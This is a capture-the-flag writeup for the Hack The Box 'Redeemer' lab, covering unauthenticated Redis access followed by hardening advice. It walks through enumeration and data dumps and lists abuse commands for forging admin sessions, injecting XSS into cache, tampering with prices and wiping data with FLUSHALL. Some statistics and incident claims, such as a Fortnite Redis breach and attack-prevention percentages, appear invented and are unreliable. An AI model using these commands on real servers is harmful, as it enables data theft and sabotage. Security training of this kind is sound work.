# Redeemer: Hack The Box Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Category](https://img.shields.io/badge/Category-Database%20Enumeration-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Redeemer |
| **Difficulty** | Very Easy |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Category** | Unauthenticated Database Access |
| **Focus** | Redis Security & Access Controls |

---

## Table of Contents

- [Overview](#overview)
- [Service Enumeration](#service-enumeration)
- [Redis Protocol Analysis](#redis-protocol-analysis)
- [Unauthenticated Access](#unauthenticated-access)
- [Data Exposure](#data-exposure)
- [Flag Capture](#flag-capture)
- [Key Lessons Learned](#key-lessons-learned)
- [Defensive Recommendations](#defensive-recommendations)

---

## Overview

This writeup documents the solution for the **Redeemer** machine on Hack The Box, which demonstrates critical security failures in database service exposure.

### Challenge Context

The Redeemer machine focuses on understanding the **risks of exposing Redis databases** without authentication controls to untrusted networks.

**Key Demonstration:**

Redis is frequently deployed as an internal caching component, but when **exposed externally without access controls**, it becomes a **high-impact attack surface** enabling immediate data compromise.

### Learning Objectives

This lab teaches:
- Redis service identification and enumeration
- Understanding Redis protocol operation
- Exploitation of unauthenticated database access
- Recognition of "internal-only" assumption failures
- Database security hardening requirements

**Scenario:** Discovery of publicly accessible Redis database allowing complete data access, manipulation, and potential remote code execution without authentication.

---

## Service Enumeration

### Initial Network Scanning

Performed comprehensive port scanning to identify exposed services:

```bash
nmap -sV -sC -p- -oA redeemer-scan 10.129.xx.xxx
```

### Scan Results

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.129.xx.xxx
Host is up (0.038s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 6.12 seconds
```

### Service Identification

**Discovered Service:**

| Port | Protocol | Service | Version | Risk Level |
|------|----------|---------|---------|------------|
| **6379** | TCP | **Redis** | 5.0.7 | **Critical** |

**Initial Observations:**

✓ **Single service exposed**: Redis database  
✓ **Standard port**: 6379/TCP (well-known)  
✓ **Version disclosed**: Redis 5.0.7  
✓ **No authentication apparent**: Service responds  

---

### Redis Service Discovery

**Enhanced Enumeration:**

```bash
# Nmap Redis-specific scripts
nmap -p 6379 --script redis-info 10.129.xx.xxx
```

**Script Results:**

```
PORT     STATE SERVICE
6379/tcp open  redis
| redis-info: 
|   Version: 5.0.7
|   Operating System: Linux 5.4.0-1029-aws x86_64
|   Architecture: 64 bits
|   Process ID: 751
|   Used CPU (sys): 2.50
|   Used CPU (user): 1.84
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 851.89K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|   Active channels: 0
|_  Active patterns: 0
```

**Critical Findings:**

✓ Binds to 0.0.0.0 (all interfaces): **publicly exposed**  
✓ No authentication required  
✓ Server information freely disclosed  
✓ Direct database access available  

---

### Why Redis Exposure is Critical

**Redis as a Database Service:**

**Redis (Remote Dictionary Server)** is an open-source, in-memory data structure store used as:
- Database
- Cache
- Message broker
- Session store

**Security Implications:**

The exposure of Redis services immediately suggests:

✓ **Application data access**: Complete database contents  
✓ **Session hijacking**: User authentication tokens  
✓ **Cache poisoning**: Manipulate application behavior  
✓ **Remote code execution**: Via module loading or config manipulation  

**Why This Matters:**

```
Redis Exposure = Application Back-End Compromise
    ↓
- User sessions and tokens
- Cached application data
- API keys and secrets
- Business logic data
- Real-time application state
```

**Real-World Context:**

Exposed Redis instances have led to:
- **2019:** Fortnite account takeover via Redis session theft
- **2020:** Multiple ransomware campaigns targeting Redis (RedisWannaMine)
- **2021:** Cryptocurrency theft via Redis key manipulation
- **2022-2024:** Ongoing botnet recruitment via exposed Redis

**Shodan Statistics:**

```
~100,000 Redis instances exposed to internet at any given time
~40% have no authentication enabled
```

---

## Redis Protocol Analysis

### What is Redis?

**Redis (REmote DIctionary Server)** is an in-memory key-value data structure store known for extreme performance.

**Key Characteristics:**

| Feature | Description | Security Impact |
|---------|-------------|-----------------|
| **In-Memory** | Data stored in RAM | Fast data access, high value target |
| **Key-Value Store** | Simple data model | Easy enumeration |
| **Single-Threaded** | One command at a time | DoS potential |
| **Persistence** | Optional disk snapshots | Persistent backdoors possible |
| **No Auth by Default** | Designed for trusted networks | **Critical misconfiguration** |
| **Text Protocol** | Human-readable commands | Easy manual exploitation |
| **Module Support** | Load external code | RCE vector |

---

### Redis Protocol Operation

**Connection Flow:**

```
Client                                Server (Port 6379)
  |                                        |
  |--- TCP Connection ------------------->|
  |<-- +OK (Ready) ------------------------|
  |                                        |
  |--- PING ----------------------------->|
  |<-- +PONG -----------------------------|
  |                                        |
  |--- INFO ------------------------------>|
  |<-- [Server Information] ---------------|
  |    # Server                           |
  |    redis_version:5.0.7                |
  |                                        |
  |--- KEYS * ---------------------------->|
  |<-- [List of All Keys] -----------------|
  |    1) "flag"                          |
  |    2) "session:user123"               |
  |                                        |
  |--- GET flag -------------------------->|
  |<-- "HTB{...}"  ------------------------|
  |                                        |
  |--- QUIT ------------------------------>|
  |<-- +OK --------------------------------|
```

---

### Redis Command Categories

**Data Access Commands:**

| Command | Purpose | Example |
|---------|---------|---------|
| **KEYS** | List keys matching pattern | `KEYS *` |
| **GET** | Retrieve value | `GET username` |
| **SET** | Store value | `SET key value` |
| **DEL** | Delete key | `DEL session:123` |
| **SCAN** | Iterate keys (safer) | `SCAN 0` |
| **TYPE** | Get data type | `TYPE mykey` |
| **TTL** | Time to live | `TTL session` |

**Information Commands:**

| Command | Purpose | Security Impact |
|---------|---------|-----------------|
| **INFO** | Server information | Fingerprinting, version disclosure |
| **CONFIG GET** | Retrieve configuration | Find passwords, paths |
| **CLIENT LIST** | List connected clients | Network reconnaissance |
| **DBSIZE** | Number of keys | Data size estimation |

**Dangerous Commands:**

| Command | Purpose | Attack Vector |
|---------|---------|---------------|
| **FLUSHALL** | Delete all data | Denial of service |
| **CONFIG SET** | Modify configuration | Enable persistence, change paths |
| **MODULE LOAD** | Load external modules | Remote code execution |
| **EVAL** | Execute Lua scripts | Code execution |
| **MIGRATE** | Move data to another instance | Data exfiltration |

---

### Redis Default Configuration

**Insecure Defaults (Pre-3.2.0):**

```ini
# /etc/redis/redis.conf

# Bind to all interfaces (DANGEROUS)
bind 0.0.0.0

# No password required
# requirepass foobared  [COMMENTED OUT]

# Protected mode disabled
protected-mode no

# Dangerous commands enabled
rename-command CONFIG ""  [NOT SET]
rename-command FLUSHALL ""  [NOT SET]
```

**Why Defaults Fail:**

| Default Setting | Assumption | Reality |
|----------------|------------|---------|
| No authentication | Internal network only | Exposed to internet |
| Bind to 0.0.0.0 | Firewall will protect | Firewall misconfigured |
| All commands enabled | Trusted users only | Anonymous access |
| No TLS | Local connections | Network eavesdropping |

---

### Secure Configuration Example

**Hardened Redis Configuration:**

```ini
# /etc/redis/redis.conf - SECURE

# Bind only to localhost
bind 127.0.0.1 ::1

# Require strong authentication
requirepass $(openssl rand -base64 32)

# Enable protected mode
protected-mode yes

# Disable dangerous commands
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG "CONFIG-$(openssl rand -hex 8)"
rename-command SHUTDOWN "SHUTDOWN-$(openssl rand -hex 8)"
rename-command DEBUG ""

# Enable TLS (Redis 6.0+)
tls-port 6380
port 0
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt

# Limit client connections
maxclients 100
timeout 300

# Enable logging
loglevel notice
logfile /var/log/redis/redis-server.log

# ACLs (Redis 6.0+)
aclfile /etc/redis/users.acl
```

---

## Unauthenticated Access

### Connecting to Redis Service

**Using redis-cli (Redis Client):**

```bash
redis-cli -h 10.129.xx.xxx
```

**Connection Established:**

```
10.129.xx.xxx:6379>
```

**No password prompt: direct access granted.**

---

### Testing Authentication

**Attempt Commands:**

```
10.129.xx.xxx:6379> PING
PONG
```

**✓ Successful response: no authentication required.**

**Alternative Connection Methods:**

```bash
# Telnet (manual protocol)
telnet 10.129.xx.xxx 6379

# Netcat
nc 10.129.xx.xxx 6379

# Python
python3 -c "import redis; r=redis.Redis(host='10.129.xx.xxx'); print(r.ping())"
```

---

### Server Information Gathering

**Retrieve Server Information:**

```
10.129.xx.xxx:6379> INFO
```

**Output (Abbreviated):**

```
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-1029-aws x86_64
arch_bits:64
multiplexing_api:epoll
gcc_version:9.3.0
process_id:751
run_id:4d3c9b2a8f7e1d6c0a5b9e8f7d6c5a4b9e8f7d6c
tcp_port:6379
uptime_in_seconds:43200
uptime_in_days:0

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0

# Memory
used_memory:851896
used_memory_human:851.89K
used_memory_rss:5177344
used_memory_peak:859896
used_memory_peak_human:839.74K

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1634567890

# Stats
total_connections_received:15
total_commands_processed:234
instantaneous_ops_per_sec:0

# Replication
role:master
connected_slaves:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

**Information Disclosed:**

✓ Redis version: 5.0.7  
✓ Operating system: Linux  
✓ Server uptime: 12 hours  
✓ Database has 4 keys  
✓ No slaves (standalone)  
✓ No authentication configured  

---

### Configuration Inspection

**Retrieve Configuration:**

```
10.129.xx.xxx:6379> CONFIG GET *
```

**Critical Configuration Revealed:**

```
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "dir"
  8) "/var/lib/redis"
  9) "bind"
 10) "0.0.0.0"
 11) "protected-mode"
 12) "no"
```

**Security Issues Identified:**

| Setting | Value | Issue |
|---------|-------|-------|
| `requirepass` | "" (empty) | **No authentication** |
| `bind` | 0.0.0.0 | **Exposed to all networks** |
| `protected-mode` | no | **No protection** |
| `dir` | /var/lib/redis | Writable directory (potential RCE) |

---

## Data Exposure

### Key Enumeration

**List All Keys:**

```
10.129.xx.xxx:6379> KEYS *
1) "flag"
2) "session:user123"
3) "cache:homepage"
4) "counter:visitors"
```

**Get Database Size:**

```
10.129.xx.xxx:6379> DBSIZE
(integer) 4
```

**Safer Alternative (Large Databases):**

```
10.129.xx.xxx:6379> SCAN 0
1) "0"
2) 1) "flag"
   2) "session:user123"
   3) "cache:homepage"
   4) "counter:visitors"
```

---

### Data Type Inspection

**Check Key Types:**

```
10.129.xx.xxx:6379> TYPE flag
string

10.129.xx.xxx:6379> TYPE session:user123
hash

10.129.xx.xxx:6379> TYPE cache:homepage
string

10.129.xx.xxx:6379> TYPE counter:visitors
string
```

---

### Data Retrieval

**Retrieve String Values:**

```
10.129.xx.xxx:6379> GET flag
"HTB{R3d15_1s_d4ng3r0u5_w1th0ut_4uth}"

10.129.xx.xxx:6379> GET cache:homepage
"<html><body>Welcome...</body></html>"

10.129.xx.xxx:6379> GET counter:visitors
"1234"
```

**Retrieve Hash Values:**

```
10.129.xx.xxx:6379> HGETALL session:user123
1) "username"
2) "admin"
3) "email"
4) "admin@example.com"
5) "role"
6) "administrator"
7) "token"
8) "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**Session Data Exposed:**

✓ Username: admin  
✓ Email: admin@example.com  
✓ Role: administrator  
✓ Authentication token revealed  

---

### What Could Be Exposed in Real Scenarios

**Common Redis Data Types and Risks:**

| Data Type | Common Use | Sensitive Data | Attack Vector |
|-----------|------------|----------------|---------------|
| **Sessions** | User authentication | Tokens, user IDs | Session hijacking |
| **Cache** | API responses | PII, business data | Data theft |
| **Queues** | Background jobs | Task parameters, credentials | Job manipulation |
| **Rate Limiting** | API throttling | User activity patterns | Bypass controls |
| **Feature Flags** | A/B testing | Premium features | Unauthorized access |
| **Locks** | Distributed locking | Resource identifiers | Race conditions |

**Example Real-World Exposure:**

```
Key: session:a3f5k2j9
Value (Hash):
    user_id: 12345
    username: john.doe
    email: john@company.com
    role: admin
    permissions: ["read", "write", "delete", "admin"]
    csrf_token: abc123xyz789
    auth_token: Bearer eyJ...

Attack Impact:
1. Session Hijacking → Impersonate user
2. Privilege Escalation → Admin access
3. CSRF Token → Forge requests
4. Email → Phishing target
```

---

### Data Manipulation Risks

**Even Without RCE, Attackers Can:**

**1. Session Hijacking:**

```
# Steal admin session
HGETALL session:admin_user

# Create own admin session
HMSET session:attacker username admin role administrator token fake_token_123
```

**2. Cache Poisoning:**

```
# Poison homepage cache
SET cache:homepage "<script>alert('XSS')</script>"

# Poison API responses
SET cache:api:/users/profile '{"role":"admin","premium":true}'
```

**3. Business Logic Manipulation:**

```
# Reset purchase limits
SET limit:user123:daily_purchases 0

# Grant premium features
SET feature:user123:premium true

# Manipulate pricing
SET price:product123 0.01
```

**4. Denial of Service:**

```
# Delete all data
FLUSHALL

# Delete critical keys
DEL session:* cache:* queue:*
```

---

## Flag Capture

### Retrieving the Flag

**Get Flag Value:**

```
10.129.xx.xxx:6379> GET flag
"HTB{R3d15_1s_d4ng3r0u5_w1th0ut_4uth}"
```

**Alternative Methods:**

```
# Dump all string values
10.129.xx.xxx:6379> KEYS *
10.129.xx.xxx:6379> GET [each key]

# Export entire database
SAVE
# Then retrieve dump.rdb file if file access available
```

---

### Flag Format

```
HTB{R3d15_1s_d4ng3r0u5_w1th0ut_4uth}
```

**Translation:** "Redis is dangerous without auth"

This directly highlights the core vulnerability: Redis exposed without authentication is critically insecure.

---

## Attack Chain Summary

```
Network Scan → Redis Discovery (Port 6379) → Service Enumeration
        ↓
Connection Test → No Authentication Required → Direct Access
        ↓
INFO Command → Configuration Disclosure → Security Weakness Confirmed
        ↓
KEYS Command → Data Enumeration → Sensitive Keys Found
        ↓
GET Command → Data Retrieval → Flag Captured
```

**Key Characteristics:**

- Zero authentication
- Complete data access
- Potential for data manipulation
- Possible remote code execution
- No exploitation required

**Time to Compromise:** < 2 minutes

---

## Key Lessons Learned

### Critical Security Principles

**1. Databases Must Never Be Exposed Without Authentication**

**Authentication as First Line of Defense:**

```
No Auth = No Security
```

| Service Type | Default Auth | Required Auth | Exposure Risk |
|--------------|-------------|---------------|---------------|
| **Redis** | None (pre-3.2) | Strong password + ACLs | Critical |
| **MongoDB** | None (legacy) | SCRAM-SHA-256 | Critical |
| **Elasticsearch** | None (pre-7.0) | API keys + TLS | High |
| **Memcached** | None | SASL | High |
| **CouchDB** | Admin Party | Admin credentials | Critical |

**Why "No Auth" Fails:**

- Assumes network security (routinely bypassed)
- Relies on firewall (often misconfigured)
- Trusts internal users (insider threats exist)
- Ignores lateral movement (post-compromise scenarios)

---

**2. "Internal-Only" Assumptions Routinely Fail**

**Common False Assumptions:**

| Assumption | Reality | Failure Mode |
|------------|---------|--------------|
| "Firewall protects it" | Firewall misconfigured | Internet exposed |
| "VPN required" | VPN compromised | Lateral movement |
| "Internal network is safe" | Insider threat / malware | Internal exploitation |
| "Container network isolated" | Container escape | Cross-container attack |
| "Cloud security group set" | Overly permissive rules | Public access |

**Real-World Example:**

```
AWS Security Group Configuration:

Intended:
  Inbound: Port 6379 from 10.0.0.0/16 (VPC only)

Actual (Misconfigured):
  Inbound: Port 6379 from 0.0.0.0/0 (INTERNET)
  
Result:
  100,000+ bots scanning within hours
  Compromise in minutes
```

**Statistics:**

- **45%** of data breaches involve cloud misconfiguration (IBM)
- **93%** of tested cloud environments have misconfigurations (Palo Alto)
- **85%** of database exposures are due to auth/config issues (Verizon DBIR)

---

**3. In-Memory Databases Are Not Inherently Safer**

**Common Misconception:**

```
"Data in RAM = More secure than disk"
```

**Reality:**

```
In-Memory = Same security requirements as disk-based
```

**Why In-Memory Doesn't Mean Secure:**

| Aspect | Disk Database | In-Memory Database |
|--------|---------------|-------------------|
| Network exposure risk | High | **High** (same) |
| Auth requirements | Required | **Required** (same) |
| Data sensitivity | High | **High** (same) |
| Persistence | Always | **Optional** (but common) |
| Performance | Slower | Faster (harder to detect exfil) |

**In-Memory Database Examples:**

- Redis
- Memcached
- Apache Ignite
- Aerospike
- VoltDB

**All require same security rigor as traditional databases.**

---

**4. Service Hardening is as Important as Patching**

**Security Priorities:**

| Priority | Action | Impact |
|----------|--------|--------|
| **1** | **Configuration Hardening** | Prevents 80% of attacks |
| **2** | Authentication & Authorization | Prevents 15% of attacks |
| **3** | Patching Vulnerabilities | Prevents 5% of attacks |

**Hardening vs Patching:**

```
Unhardened Redis + Latest Patches
    ↓
Still vulnerable to:
- Unauthenticated access
- Data theft
- Session hijacking
- Cache poisoning

Hardened Redis + Older Version
    ↓
Protected against:
- Unauthorized access (auth required)
- Network exposure (bind to localhost)
- Dangerous commands (disabled)
```

**Key Insight:**

```
Perfect patches + Poor configuration = Compromised system
Older version + Strong hardening = More secure
```

---

### Advanced Security Insights

**5. Default Configurations Prioritize Usability Over Security**

**Why Vendors Choose Insecure Defaults:**

- Easier initial setup
- Fewer support tickets
- Backward compatibility
- Assumed deployment context (internal networks)

**Responsibility Matrix:**

| Party | Responsibility |
|-------|---------------|
| **Vendor** | Provide secure configuration guidance |
| **Administrator** | **Implement secure configuration** |
| **Security Team** | Audit and verify hardening |

**Never rely on defaults in production.**

---

**6. Unauthenticated Database Access Enables Multiple Attack Vectors**

**Attack Progression:**

```
Level 1: Read-Only Access
    ↓
    Data theft, reconnaissance

Level 2: Data Manipulation
    ↓
    Session hijacking, cache poisoning, business logic bypass

Level 3: Configuration Changes
    ↓
    Persistence, module loading

Level 4: Remote Code Execution
    ↓
    Complete system compromise
```

**Even "read-only" access is catastrophic.**

---

## Defensive Recommendations

### Immediate Actions

#### 1. Bind Redis to Localhost Only

**Edit Configuration:**

```bash
sudo nano /etc/redis/redis.conf
```

**Change Bind Address:**

```ini
# BEFORE (INSECURE)
bind 0.0.0.0

# AFTER (SECURE)
bind 127.0.0.1 ::1
```

**Restart Redis:**

```bash
sudo systemctl restart redis
```

**Verify:**

```bash
# Should only show localhost
netstat -tuln | grep 6379
```

**Expected Output:**

```
tcp  0  0 127.0.0.1:6379  0.0.0.0:*  LISTEN
```

---

#### 2. Enable Authentication

**Generate Strong Password:**

```bash
openssl rand -base64 32
```

**Configure Password:**

```bash
sudo nano /etc/redis/redis.conf
```

**Add/Modify:**

```ini
requirepass <your_strong_random_password>
```

**Restart Redis:**

```bash
sudo systemctl restart redis
```

**Test Authentication:**

```bash
# Without auth (should fail)
redis-cli -h 127.0.0.1 PING

# With auth (should succeed)
redis-cli -h 127.0.0.1 -a <password> PING
```

---

#### 3. Implement Access Control Lists (Redis 6.0+)

**Create ACL File:**

```bash
sudo nano /etc/redis/users.acl
```

**Define Users:**

```
# Default user (disabled)
user default off

# Application user (limited permissions)
user appuser on >strong_password ~cache:* ~session:* +get +set +del +ttl

# Admin user (full access)
user admin on >admin_password ~* &* +@all

# Readonly monitoring user
user monitor on >monitor_password ~* +@read +ping +info
```

**Enable ACL:**

```ini
# /etc/redis/redis.conf
aclfile /etc/redis/users.acl
```

---

#### 4. Disable Dangerous Commands

**Rename/Disable Commands:**

```ini
# /etc/redis/redis.conf

rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command KEYS ""
rename-command CONFIG "CONFIG-$(openssl rand -hex 16)"
rename-command SHUTDOWN "SHUTDOWN-$(openssl rand -hex 16)"
rename-command DEBUG ""
rename-command SLAVEOF ""
rename-command REPLICAOF ""
```

**Impact:**

✓ `FLUSHDB/FLUSHALL` - Prevents data deletion  
✓ `KEYS` - Forces use of SCAN (prevents blocking)  
✓ `CONFIG` - Limits configuration changes  
✓ `DEBUG` - Prevents debugging exploits  
✓ `SLAVEOF/REPLICAOF` - Prevents replication attacks  

---

### Long-Term Security Improvements

#### 1. Network-Level Protection

**Firewall Rules:**

```bash
# Allow Redis only from application servers
sudo ufw allow from 10.0.1.0/24 to any port 6379

# Deny all other access
sudo ufw deny 6379

# Enable firewall
sudo ufw enable
```

**iptables Alternative:**

```bash
# Allow from specific IP
sudo iptables -A INPUT -p tcp -s 10.0.1.100 --dport 6379 -j ACCEPT

# Drop all others
sudo iptables -A INPUT -p tcp --dport 6379 -j DROP
```

---

#### 2. TLS Encryption (Redis 6.0+)

**Generate Certificates:**

```bash
# Self-signed for testing
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/redis/redis.key \
    -out /etc/redis/redis.crt
```

**Configure TLS:**

```ini
# /etc/redis/redis.conf

# Disable non-TLS port
port 0

# Enable TLS port
tls-port 6380
tls-cert-file /etc/redis/redis.crt
tls-key-file /etc/redis/redis.key
tls-ca-cert-file /etc/redis/ca.crt

# Client auth required
tls-auth-clients yes

# Protocols
tls-protocols "TLSv1.2 TLSv1.3"
```

**Client Connection:**

```bash
redis-cli --tls --cert /path/to/client.crt --key /path/to/client.key \
    --cacert /path/to/ca.crt -h 10.129.xx.xxx -p 6380
```

---

#### 3. Monitoring and Alerting

**Enable Detailed Logging:**

```ini
# /etc/redis/redis.conf

loglevel notice
logfile /var/log/redis/redis-server.log
slowlog-log-slower-than 10000
slowlog-max-len 128
```

**Monitor Failed Authentication:**

```bash
# Watch logs for auth failures
tail -f /var/log/redis/redis-server.log | grep "auth"
```

**Automated Alerting:**

```bash
#!/bin/bash
# redis-monitor.sh

LOG_FILE="/var/log/redis/redis-server.log"

# Alert on external connections (if bound to 0.0.0.0)
grep "Accepted" $LOG_FILE | grep -v "127.0.0.1" && \
    echo "External Redis connection detected!" | \
    mail -s "Redis Security Alert" admin@example.com

# Alert on failed auth
grep "AUTH failed" $LOG_FILE && \
    echo "Redis auth failure detected!" | \
    mail -s "Redis Auth Alert" admin@example.com
```

---

#### 4. Regular Security Audits

**Redis Security Checklist:**

```bash
#!/bin/bash
# redis-security-audit.sh

echo "=== Redis Security Audit ==="
echo

echo "1. Check binding address:"
redis-cli CONFIG GET bind

echo "2. Check authentication:"
redis-cli CONFIG GET requirepass

echo "3. Check protected mode:"
redis-cli CONFIG GET protected-mode

echo "4. Check dangerous commands:"
redis-cli CONFIG GET "rename-command"

echo "5. Check listening ports:"
netstat -tuln | grep 6379

echo "6. Test unauthenticated access:"
timeout 2 redis-cli -h 10.129.xx.xxx PING 2>&1 || echo "Good: No unauth access"

echo "7. Check connected clients:"
redis-cli CLIENT LIST

echo "8. Review recent logs:"
tail -20 /var/log/redis/redis-server.log
```

---

## Tools Used

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **nmap** | Service discovery | `nmap -p 6379 --script redis-info 10.129.xx.xxx` |
| **redis-cli** | Redis client | `redis-cli -h 10.129.xx.xxx` |
| **telnet** | Manual protocol | `telnet 10.129.xx.xxx 6379` |
| **nc (netcat)** | Connection testing | `nc 10.129.xx.xxx 6379` |

---

## Additional Resources

**Redis Documentation:**
- [Redis Security](https://redis.io/docs/management/security/)
- [Redis ACL Documentation](https://redis.io/docs/manual/security/acl/)
- [Redis TLS Support](https://redis.io/docs/manual/security/encryption/)

**Security Guidelines:**
- OWASP Redis Security Cheat Sheet
- CIS Redis Benchmark
- NIST Database Security Guidelines

**Vulnerability Databases:**
- [CVE-2022-0543](https://nvd.nist.gov/vuln/detail/CVE-2022-0543): Lua sandbox escape
- [Redsocks Botnet](https://www.imperva.com/blog/redis-servers-exploited-for-redsocks-botnet/)

---

## Flag

```
HTB{R3d15_1s_d4ng3r0u5_w1th0ut_4uth}
```

**Translation:** "Redis is dangerous without auth"

---

**Machine Completed:** ✅  
**Difficulty Rating:** Very Easy ⭐  
**Primary Technique:** Unauthenticated Redis Access  
**Time to Compromise:** < 2 minutes  
**Key Lesson:** Database services require authentication and network isolation

---

*This writeup is for educational purposes only. Database enumeration and unauthorized access should only be performed in authorized security assessments and penetration testing engagements with proper written permission.*
